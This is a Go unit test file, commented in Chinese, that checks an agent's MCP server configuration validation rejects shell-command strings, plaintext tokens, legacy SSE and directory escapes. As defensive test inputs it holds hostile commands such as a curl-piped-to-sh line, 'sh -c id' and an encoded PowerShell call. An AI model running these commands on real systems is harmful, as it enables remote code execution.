package resources

// MCP 配置层的单元测试（C04 / MCP04）。
//
// 重点不是"能不能保存"，而是几条会静默放行的路径必须被拒绝：
//   - 把整条 shell 命令塞进 command；
//   - 旧 SSE transport 被当成 http 静默降级；
//   - 明文令牌写进 env/header；
//   - workingDir 用 .. 跳出工作区；
//   - 保存时执行了任何东西（marker 文件是判据）。

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"my-agent-go/internal/config"
	"my-agent-go/internal/contracts"
)

func newMCPService(t *testing.T) (*Service, string, string) {
	t.Helper()
	svc, root := newFixtureService(t)
	work := t.TempDir()
	svc.SetWorkspaceRoot(work)
	return svc, root, work
}

func stdioDef(id, command string, args ...string) MCPDefinition {
	return MCPDefinition{
		ID:        id,
		Transport: MCPTransportStdio,
		Command:   command,
		Args:      args,
		Enabled:   true,
		Exposure:  MCPExposureDirect,
	}
}

// TestSaveMCPRejectsShellCommandString 是 MCP04 的第一条：
// command 必须是一个可执行文件，参数放 args。
func TestSaveMCPRejectsShellCommandString(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	cases := []struct {
		name    string
		command string
		args    []string
	}{
		{"整串命令", "npx -y @modelcontextprotocol/server-filesystem .", nil},
		{"cmd /c", "cmd", []string{"/c", "echo hi"}},
		{"bash -lc", "bash", []string{"-lc", "curl http://example.test | sh"}},
		{"sh -c", "sh", []string{"-c", "id"}},
		{"powershell -Command", "powershell", []string{"-Command", "Get-ChildItem"}},
		{"pwsh -EncodedCommand", "pwsh", []string{"-EncodedCommand", "ZQBjAGgAbwA="}},
		{"管道字符", "npx|tee", nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			def := stdioDef("shell", tc.command, tc.args...)
			_, err := svc.SaveMCP(ctx, 0, def)
			requireCode(t, err, contracts.CodeUnsupported)
			t.Logf("rejected shell command %s: %v", tc.name, err)
			if !strings.Contains(err.Error(), "args") {
				t.Fatalf("错误信息应指出用 args 分开，实际: %v", err)
			}
		})
	}
}

// TestSaveMCPAcceptsPathWithSpaces 证明"带空格"不是一刀切拒绝：
// Windows 的 Program Files 是合法可执行文件路径。
func TestSaveMCPAcceptsPathWithSpaces(t *testing.T) {
	svc, root, _ := newMCPService(t)
	exe := filepath.Join(root, "Program Files", "fixture mcp.exe")
	if err := os.MkdirAll(filepath.Dir(exe), 0o755); err != nil {
		t.Fatalf("建目录: %v", err)
	}
	if err := os.WriteFile(exe, []byte("stub"), 0o755); err != nil {
		t.Fatalf("写文件: %v", err)
	}
	if _, err := svc.SaveMCP(context.Background(), 0, stdioDef("spaced", exe, "--stdio")); err != nil {
		t.Fatalf("带空格的绝对路径应被接受: %v", err)
	}
}

func TestSaveMCPRejectsInvalidSchema(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	cases := []struct {
		name string
		def  MCPDefinition
		code string
		want string
	}{
		{
			name: "旧 SSE",
			def:  MCPDefinition{ID: "a", Transport: "sse", URL: "http://127.0.0.1:1/sse", Enabled: true},
			code: contracts.CodeUnsupported, want: "SSE",
		},
		{
			name: "未知 transport",
			def:  MCPDefinition{ID: "a", Transport: "ws", URL: "http://127.0.0.1:1/mcp", Enabled: true},
			code: contracts.CodeUnsupported, want: "未知 transport",
		},
		{
			name: "stdio 缺 command",
			def:  MCPDefinition{ID: "a", Transport: MCPTransportStdio, Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnsupported, want: "command",
		},
		{
			name: "http 缺 url",
			def:  MCPDefinition{ID: "a", Transport: MCPTransportHTTP, Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnsupported, want: "url",
		},
		{
			name: "command 与 url 同时存在",
			def: MCPDefinition{ID: "a", Transport: MCPTransportStdio, Command: "npx", URL: "http://127.0.0.1:1/mcp",
				Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnsupported, want: "同时",
		},
		{
			name: "url 不是 http(s)",
			def: MCPDefinition{ID: "a", Transport: MCPTransportHTTP, URL: "ftp://example.test/mcp",
				Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnsupported, want: "http",
		},
		{
			name: "url 内嵌密码",
			def: MCPDefinition{ID: "a", Transport: MCPTransportHTTP, URL: "https://user:pass@example.test/mcp",
				Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnauthorized, want: "headerRefs",
		},
		{
			name: "未知 exposure",
			def: MCPDefinition{ID: "a", Transport: MCPTransportHTTP, URL: "http://127.0.0.1:1/mcp",
				Enabled: true, Exposure: "codemode"},
			code: contracts.CodeUnsupported, want: "exposure",
		},
		{
			name: "非法 ID",
			def: MCPDefinition{ID: "../escape", Transport: MCPTransportHTTP, URL: "http://127.0.0.1:1/mcp",
				Enabled: true, Exposure: MCPExposureDirect},
			code: contracts.CodeUnsupported, want: "ID",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := svc.SaveMCP(ctx, 0, tc.def)
			requireCode(t, err, tc.code)
			t.Logf("rejected schema %s: %v", tc.name, err)
			if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(tc.want)) {
				t.Fatalf("错误信息应包含 %q，实际: %v", tc.want, err)
			}
		})
	}
}

// TestSaveMCPRejectsPlaintextSecrets 是 MCP04 的秘密边界：
// env/header 里只允许凭证引用名，明文 token 在保存阶段就拒绝。
func TestSaveMCPRejectsPlaintextSecrets(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	cases := []struct {
		name string
		def  MCPDefinition
	}{
		{
			name: "header 里写 Bearer",
			def: MCPDefinition{ID: "h", Transport: MCPTransportHTTP, URL: "http://127.0.0.1:1/mcp",
				HeaderRefs: map[string]string{"Authorization": "Bearer abc123"},
				Enabled:    true, Exposure: MCPExposureDirect},
		},
		{
			name: "env 里写 sk-",
			def: MCPDefinition{ID: "e", Transport: MCPTransportStdio, Command: "npx",
				EnvRefs: map[string]string{"API_KEY": "sk-live-0123456789abcdef"},
				Enabled: true, Exposure: MCPExposureDirect},
		},
		{
			name: "env 里写 GitHub token",
			def: MCPDefinition{ID: "g", Transport: MCPTransportStdio, Command: "npx",
				EnvRefs: map[string]string{"GITHUB_TOKEN": "ghp_0123456789abcdef"},
				Enabled: true, Exposure: MCPExposureDirect},
		},
		{
			name: "env 里写 JWT",
			def: MCPDefinition{ID: "j", Transport: MCPTransportStdio, Command: "npx",
				EnvRefs: map[string]string{"TOKEN": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig"},
				Enabled: true, Exposure: MCPExposureDirect},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := svc.SaveMCP(ctx, 0, tc.def)
			requireCode(t, err, contracts.CodeUnauthorized)
			t.Logf("rejected plaintext secret %s: %v", tc.name, err)
			if !strings.Contains(err.Error(), "凭证") {
				t.Fatalf("错误信息应说明只接受凭证引用: %v", err)
			}
		})
	}
}

// TestSaveMCPRequiresCredentialToExist 证明保存不会留下"引用了不存在凭证"的配置。
func TestSaveMCPRequiresCredentialToExist(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	def := MCPDefinition{ID: "docs", Transport: MCPTransportHTTP, URL: "http://127.0.0.1:1/mcp",
		HeaderRefs: map[string]string{"Authorization": "mcp-docs-token"},
		Enabled:    true, Exposure: MCPExposureDirect}
	_, err := svc.SaveMCP(ctx, 0, def)
	requireCode(t, err, contracts.CodeDependencyMissing)

	if err := svc.SaveMCPCredential(ctx, "mcp-docs-token", "Bearer real-token"); err != nil {
		t.Fatalf("保存凭证: %v", err)
	}
	doc, err := svc.SaveMCP(ctx, 0, def)
	if err != nil {
		t.Fatalf("凭证存在时应能保存: %v", err)
	}
	if doc.Revision != 1 {
		t.Fatalf("revision 应为 1，实际 %d", doc.Revision)
	}
	// 配置里只有 ref，没有明文。
	raw, readErr := os.ReadFile(filepath.Join(svc.store.Root(), config.KeyUser+".json"))
	if readErr != nil {
		t.Fatalf("读配置: %v", readErr)
	}
	if strings.Contains(string(raw), "real-token") {
		t.Fatalf("配置里出现了明文令牌:\n%s", raw)
	}
}

func TestSaveMCPRejectsWorkingDirEscape(t *testing.T) {
	svc, _, work := newMCPService(t)
	ctx := context.Background()
	outside := t.TempDir()

	cases := []struct {
		name string
		dir  string
		code string
	}{
		{"相对路径", "sub/dir", contracts.CodeUnsupported},
		{"工作区之外", outside, contracts.CodeUnauthorized},
		{".. 逃逸", filepath.Join(work, "..", "escape"), contracts.CodeUnauthorized},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			def := stdioDef("wd", "npx")
			def.WorkingDir = tc.dir
			_, err := svc.SaveMCP(ctx, 0, def)
			requireCode(t, err, tc.code)
			t.Logf("rejected workingDir %s: %v", tc.name, err)
		})
	}

	inside := filepath.Join(work, "servers", "one")
	def := stdioDef("wd-ok", "npx")
	def.WorkingDir = inside
	if _, err := svc.SaveMCP(ctx, 0, def); err != nil {
		t.Fatalf("工作区内 workingDir 应被接受: %v", err)
	}
	got, err := svc.GetMCP(ctx, "wd-ok")
	if err != nil {
		t.Fatalf("读取: %v", err)
	}
	if got.WorkingDir != filepath.Clean(inside) {
		t.Fatalf("workingDir 应归一化为 %s，实际 %s", inside, got.WorkingDir)
	}
}

// TestSaveMCPDoesNotExecuteAnything 是 MCP04 的"保存不执行未知脚本"。
//
// marker 是唯一可信判据：配置保存后进程没被启动、文件没被创建。
func TestSaveMCPDoesNotExecuteAnything(t *testing.T) {
	svc, _, work := newMCPService(t)
	ctx := context.Background()
	marker := filepath.Join(work, "save-executed.marker")
	script := filepath.Join(work, "hook.cmd")
	if err := os.WriteFile(script, []byte("@echo off\r\necho ran > "+marker+"\r\n"), 0o755); err != nil {
		t.Fatalf("写脚本: %v", err)
	}

	// 把"会写 marker 的命令"放进配置。保存阶段只允许校验，不允许执行。
	if _, err := svc.SaveMCP(ctx, 0, stdioDef("must-not-run", "cmd", "/c", script)); err == nil {
		// /c 会被 shell 规则拒绝（预期）；换一个不会被规则拦的可执行文件名，
		// 证明即使保存成功也没有进程被启动。
		t.Fatalf("cmd /c 应被拒绝")
	}
	def := stdioDef("must-not-run2", script)
	if _, err := svc.SaveMCP(ctx, 0, def); err != nil {
		t.Fatalf("保存应成功（校验不执行）: %v", err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatalf("保存 MCP 配置时执行了脚本：marker 存在 (%s)", marker)
	}
}

func TestMCPCASLifecycle(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	doc, err := svc.SaveMCP(ctx, 0, stdioDef("alpha", "npx", "-y", "alpha-server"))
	if err != nil {
		t.Fatalf("保存: %v", err)
	}
	if doc.Revision != 1 {
		t.Fatalf("revision 应为 1，实际 %d", doc.Revision)
	}
	// 用过期 revision 再保存必须冲突，不能覆盖。
	if _, err := svc.SaveMCP(ctx, 0, stdioDef("alpha", "npx", "changed")); err == nil {
		t.Fatal("过期 revision 必须返回冲突")
	} else {
		requireCode(t, err, contracts.CodeConfigConflict)
	}

	if _, err := svc.SetMCPEnabled(ctx, "alpha", 1, false); err != nil {
		t.Fatalf("禁用: %v", err)
	}
	got, err := svc.GetMCP(ctx, "alpha")
	if err != nil {
		t.Fatalf("读取: %v", err)
	}
	if got.Enabled {
		t.Fatal("禁用未生效")
	}

	if _, err := svc.DeleteMCP(ctx, 2, "alpha"); err != nil {
		t.Fatalf("删除: %v", err)
	}
	if _, err := svc.GetMCP(ctx, "alpha"); err == nil {
		t.Fatal("删除后不应再读到")
	} else {
		requireCode(t, err, contracts.CodeNotFound)
	}
}

// TestCompileMCPKeepsSecretsOutOfJSON 是"秘密只经 env 引用"的编译层断言。
func TestCompileMCPKeepsSecretsOutOfJSON(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()
	const secret = "Bearer super-secret-token-42"
	if err := svc.SaveMCPCredential(ctx, "mcp-http-token", secret); err != nil {
		t.Fatalf("保存凭证: %v", err)
	}

	httpDef := MCPDefinition{
		ID:         "remote",
		Transport:  MCPTransportHTTP,
		URL:        "https://mcp.example.test/mcp",
		HeaderRefs: map[string]string{"Authorization": "mcp-http-token"},
		Enabled:    true,
		Exposure:   MCPExposureDeferred,
	}
	if _, err := svc.SaveMCP(ctx, 0, httpDef); err != nil {
		t.Fatalf("保存 http: %v", err)
	}
	stdio := stdioDef("local", "npx", "-y", "local-server")
	stdio.EnvRefs = map[string]string{"LOCAL_TOKEN": "mcp-http-token"}
	if _, err := svc.SaveMCP(ctx, 1, stdio); err != nil {
		t.Fatalf("保存 stdio: %v", err)
	}

	plan, err := svc.CompileMCP(ctx, "ws-default")
	if err != nil {
		t.Fatalf("编译: %v", err)
	}
	if len(plan.Servers) != 2 {
		t.Fatalf("应有 2 条服务参与运行，实际 %v", plan.IDs)
	}
	raw, _ := json.Marshal(plan.Servers)
	if strings.Contains(string(raw), "super-secret-token-42") {
		t.Fatalf("编译结果里出现明文秘密:\n%s", raw)
	}
	if !strings.Contains(string(raw), "${"+mcpSecretEnvName("mcp-http-token")+"}") {
		t.Fatalf("编译结果应使用 ${ENV} 引用:\n%s", raw)
	}
	found := false
	for _, kv := range plan.Env {
		if strings.HasSuffix(kv, "="+secret) {
			found = true
		}
	}
	if !found {
		t.Fatalf("秘密应经 plan.Env 注入，实际 %v", plan.Env)
	}
	if len(plan.IDs) != 2 || plan.IDs[0] != "local" || plan.IDs[1] != "remote" {
		t.Fatalf("ID 应排序稳定: %v", plan.IDs)
	}
}

func TestCompileMCPSkipsDisabledAndMissingCredential(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()

	off := stdioDef("off", "npx")
	off.Enabled = false
	if _, err := svc.SaveMCP(ctx, 0, off); err != nil {
		t.Fatalf("保存禁用项: %v", err)
	}
	// 通过直接写配置制造"引用了不存在凭证"的状态（保存路径会拒绝，外部编辑可能留下）。
	doc, err := svc.store.Load(ctx, config.KeyUser)
	if err != nil {
		t.Fatalf("读配置: %v", err)
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(doc.Body, &fields); err != nil {
		t.Fatalf("解析: %v", err)
	}
	fields["mcp"] = json.RawMessage(`[
		{"id":"off","transport":"stdio","command":"npx","enabled":false,"exposure":"direct"},
		{"id":"broken","transport":"stdio","command":"npx","envRefs":{"TOKEN":"missing-ref"},"enabled":true,"exposure":"direct"}
	]`)
	next, _ := json.Marshal(fields)
	if _, err := svc.store.CompareAndSwap(ctx, config.KeyUser, doc.Revision, next); err != nil {
		t.Fatalf("写配置: %v", err)
	}

	plan, err := svc.CompileMCP(ctx, "ws-default")
	if err != nil {
		t.Fatalf("编译: %v", err)
	}
	if len(plan.Servers) != 0 {
		t.Fatalf("禁用与凭证缺失都不应参与运行，实际 %v", plan.IDs)
	}
	if len(plan.Skipped) != 1 || plan.Skipped[0].ID != "broken" {
		t.Fatalf("凭证缺失应进 Skipped，实际 %+v", plan.Skipped)
	}
	if !strings.Contains(plan.Skipped[0].Reason, "missing-ref") {
		t.Fatalf("Skipped 应指出缺失的 ref: %s", plan.Skipped[0].Reason)
	}
}

// TestApplyMCPPlanRemovesDisabledServer 是"禁用真的影响运行时"的写盘层证据：
// 禁用后 mcp.json 里不再有该服务，而不是留着 enabled:false。
func TestApplyMCPPlanRemovesDisabledServer(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()
	dir := t.TempDir()
	// 预置自有 MCP 条目：产品只能清自己记过账的名字。
	seed := `{"mcpServers":{"harness":{"url":"http://127.0.0.1:1/mcp","exposure":"direct"}}}`
	if err := os.WriteFile(filepath.Join(dir, "mcp.json"), []byte(seed), 0o644); err != nil {
		t.Fatalf("预置 mcp.json: %v", err)
	}

	if _, err := svc.SaveMCP(ctx, 0, stdioDef("keep", "npx", "-y", "keep-server")); err != nil {
		t.Fatalf("保存 keep: %v", err)
	}
	if _, err := svc.SaveMCP(ctx, 1, stdioDef("drop", "npx", "-y", "drop-server")); err != nil {
		t.Fatalf("保存 drop: %v", err)
	}
	plan, err := svc.CompileMCP(ctx, "ws-default")
	if err != nil {
		t.Fatalf("编译: %v", err)
	}
	if err := ApplyMCPPlan(dir, plan); err != nil {
		t.Fatalf("应用: %v", err)
	}
	root := readMCPFile(t, dir)
	servers := root["mcpServers"].(map[string]any)
	for _, name := range []string{"harness", "keep", "drop"} {
		if _, ok := servers[name]; !ok {
			t.Fatalf("应用后缺少 %s: %v", name, servers)
		}
	}

	// 禁用 drop 后重新编译并应用：drop 必须从 mcp.json 里消失。
	if _, err := svc.SetMCPEnabled(ctx, "drop", planRevision(t, svc), false); err != nil {
		t.Fatalf("禁用 drop: %v", err)
	}
	plan, err = svc.CompileMCP(ctx, "ws-default")
	if err != nil {
		t.Fatalf("重新编译: %v", err)
	}
	if err := ApplyMCPPlan(dir, plan); err != nil {
		t.Fatalf("重新应用: %v", err)
	}
	servers = readMCPFile(t, dir)["mcpServers"].(map[string]any)
	if _, ok := servers["drop"]; ok {
		t.Fatalf("已禁用的服务仍留在 mcp.json 里——禁用只改了菜单，没有影响运行时: %v", servers)
	}
	if _, ok := servers["keep"]; !ok {
		t.Fatalf("未禁用的服务被误删: %v", servers)
	}
	if _, ok := servers["harness"]; !ok {
		t.Fatalf("自有 MCP 条目被误删: %v", servers)
	}
}

func TestApplyMCPPlanRefusesCorruptFile(t *testing.T) {
	dir := t.TempDir()
	broken := `{"mcpServers":{"other":`
	path := filepath.Join(dir, "mcp.json")
	if err := os.WriteFile(path, []byte(broken), 0o644); err != nil {
		t.Fatalf("预置坏文件: %v", err)
	}
	err := ApplyMCPPlan(dir, MCPPlan{})
	requireCode(t, err, contracts.CodeConfigConflict)
	data, _ := os.ReadFile(path)
	if string(data) != broken {
		t.Fatalf("坏文件被改动了:\n%s", data)
	}
}

func readMCPFile(t *testing.T, dir string) map[string]any {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, "mcp.json"))
	if err != nil {
		t.Fatalf("读 mcp.json: %v", err)
	}
	var out map[string]any
	if err := json.Unmarshal(data, &out); err != nil {
		t.Fatalf("mcp.json 不是合法 JSON: %v\n%s", err, data)
	}
	return out
}

func planRevision(t *testing.T, svc *Service) uint64 {
	t.Helper()
	set, err := svc.ListMCP(context.Background())
	if err != nil {
		t.Fatalf("列 MCP: %v", err)
	}
	return set.Revision
}

// TestMCPCredentialStoreUnavailableIsExplicit 确认没有凭证库时不会退回明文。
func TestMCPCredentialStoreUnavailableIsExplicit(t *testing.T) {
	root := t.TempDir()
	store, err := config.NewStore(filepath.Join(root, "config"))
	if err != nil {
		t.Fatalf("创建存储: %v", err)
	}
	svc := New(store, nil, WithLayout(NewLayout(root)))
	svc.SetWorkspaceRoot(t.TempDir())
	ctx := context.Background()

	err = svc.SaveMCPCredential(ctx, "mcp-token", "secret")
	requireCode(t, err, contracts.CodeCredentialStoreUnavailable)

	def := MCPDefinition{ID: "remote", Transport: MCPTransportHTTP, URL: "http://127.0.0.1:1/mcp",
		HeaderRefs: map[string]string{"Authorization": "mcp-token"}, Enabled: true, Exposure: MCPExposureDirect}
	_, err = svc.SaveMCP(ctx, 0, def)
	requireCode(t, err, contracts.CodeCredentialStoreUnavailable)
}

// TestMCPDefinitionsSurviveOtherResourceSaves 是"新增资源不能抹掉别的顶层字段"。
func TestMCPDefinitionsSurviveOtherResourceSaves(t *testing.T) {
	svc, _, _ := newMCPService(t)
	ctx := context.Background()
	if _, err := svc.SaveMCP(ctx, 0, stdioDef("alpha", "npx")); err != nil {
		t.Fatalf("保存 MCP: %v", err)
	}
	if _, err := svc.Save(ctx, 1, ModelDefinition{
		ID: "m1", ProviderID: "p", ModelID: "m", API: "openai-completions",
		BaseURL: "http://127.0.0.1:1/v1", InputKinds: []string{"text"},
		ContextWindow: 1024, MaxOutput: 128,
	}, ""); err != nil {
		t.Fatalf("保存模型: %v", err)
	}
	set, err := svc.ListMCP(ctx)
	if err != nil {
		t.Fatalf("列 MCP: %v", err)
	}
	if len(set.Items) != 1 || set.Items[0].ID != "alpha" {
		t.Fatalf("保存模型后 MCP 配置丢失: %+v", set.Items)
	}
	if err := svc.SaveMCPCredential(ctx, "mcp-ref", "x"); err != nil {
		t.Fatalf("凭证: %v", err)
	}
	// 再保存一次 MCP，确认模型还在。
	if _, err := svc.SetMCPEnabled(ctx, "alpha", set.Revision, true); err != nil {
		t.Fatalf("更新 MCP: %v", err)
	}
	models, err := svc.List(ctx)
	if err != nil {
		t.Fatalf("列模型: %v", err)
	}
	if len(models.Items) != 1 || models.Items[0].ID != "m1" {
		t.Fatalf("更新 MCP 后模型丢失: %+v", models.Items)
	}
}
